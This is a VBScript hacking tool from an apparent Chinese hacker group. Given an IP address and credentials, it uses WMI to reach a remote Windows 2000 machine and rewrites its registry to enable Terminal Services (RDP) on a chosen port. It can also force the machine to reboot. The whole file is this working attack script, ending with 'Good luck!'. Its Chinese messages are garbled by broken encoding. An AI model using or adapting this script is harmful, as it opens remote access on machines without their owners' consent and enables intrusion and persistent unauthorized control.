on error resume next
set outstreem=wscript.stdout
set instreem=wscript.stdin
if (lcase(right(wscript.fullname,11))="wscript.exe") then
   set objShell=wscript.createObject("wscript.shell")
   objShell.Run("cmd.exe /k cscript //nologo "&chr(34)&wscript.scriptfullname&chr(34))
   wscript.quit
end if
if wscript.arguments.count<3 then
   usage()
   wscript.echo "Not enough parameters."
   wscript.quit
end if

ipaddress=wscript.arguments(0)
username=wscript.arguments(1)
password=wscript.arguments(2)
if wscript.arguments.count>3 then
   port=wscript.arguments(3)
else
   port=3389
end if
if not isnumeric(port) or port<1 or port>65000 then
   wscript.echo "The number of port is error."
   wscript.quit
end if
if wscript.arguments.count>4 then
   reboot=wscript.arguments(4)
else
   reboot=""
end if

usage()
outstreem.write "�������� "&ipaddress&" ...."
set objlocator=createobject("wbemscripting.swbemlocator")
set objswbemservices=objlocator.connectserver(ipaddress,"root/cimv2",username,password)
objswbemservices.security_.privileges.add 23,true
objswbemservices.security_.privileges.add 18,true
showerror(err.number)

outstreem.write "����д��...."
set colinstoscaption=objswbemservices.execquery("select caption from win32_operatingsystem")
for each objinstoscaption in colinstoscaption
   if instr(objinstoscaption.caption,"Server")>0 then
      wscript.echo "OK!"
   else
      wscript.echo "�Է�������汾�� "&objinstoscaption.caption
      outstreem.write "�ն˷���ֻ�ܰ�װ�� Advanced Server �ϣ������˳�!!!"
      strcancel=instreem.read
      if lcase(strcancel)<>"n" then wscript.quit
   end if
next

outstreem.write "д��ע��� ...."
set objinstreg=objlocator.connectserver(ipaddress,"root/default",username,password).get("stdregprov")
HKLM=&h80000002
with objinstreg
.createkey ,"SOFTWARE\Microsoft\Windows\CurrentVersion\netcache"
.setdwordvalue HKLM,"SOFTWARE\Microsoft\Windows\CurrentVersion\netcache","Enabled",0
.createkey HKLM,"SOFTWARE\Policies\Microsoft\Windows\Installer"
.setdwordvalue HKLM,"SOFTWARE\Policies\Microsoft\Windows\Installer","EnableAdminTSRemote",1
.setdwordvalue HKLM,"SYSTEM\CurrentControlSet\Control\Terminal Server","TSEnabled",1
.setdwordvalue HKLM,"SYSTEM\CurrentControlSet\Services\TermDD","Start",2
.setdwordvalue HKLM,"SYSTEM\CurrentControlSet\Services\TermService","Start",2
.setstringvalue HKLM,".DEFAULT\Keyboard Layout\Toggle","Hotkey","1"
.setdwordvalue HKLM,"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp","PortNumber",port
end with
showerror(err.number)

rebt=lcase(reboot)
if rebt="/r" or rebt="-r" or rebt="\r" then
   outstreem.write "������������...."
   strwqlquery="select * from win32_operatingsystem where primary='true'"
   set colinstances=objswbemservices.execquery(strwqlquery)
   for each objinstance in colinstances
      objinstance.win32shutdown(6)
   next
   showerror(err.number)
else
   wscript.echo "����Ҫ�������Ӻ�,����������."&vbcrlf&","
end if
wscript.echo "�����ڿ��Գ������ӷ����� "&port&" . Good luck!"

function showerror(errornumber)
if errornumber Then
   wscript.echo "Error 0x"&cstr(hex(err.number))&" ."
   if err.description <> "" then
      wscript.echo "Error description: "&err.description&"."
   end if
   wscript.quit
else
   wscript.echo "OK!"
end if
end function

function usage()
wscript.echo string(79,"*")
wscript.echo "3389�Ľű�������    ���ߣ�DANGEROUS  OICQ:472175"
wscript.echo "�й��ڿ�XС��  Xhacker Group Of China"
wscript.echo "WINDOWS 2000�ն˷�������"
wscript.echo "��ӭ���� http://www.cnxhacker,com"
wscript.echo "ʹ�÷�����"
wscript.echo "Cscript "&wscript.scriptfullname&" �Է�IP �û��� ���� [�˿�] [/r]"
wscript.echo "�˿�: ���ʹ�� 3389."
wscript.echo "/r: �Զ�����������."
wscript.echo string(79,"*")&vbcrlf
end function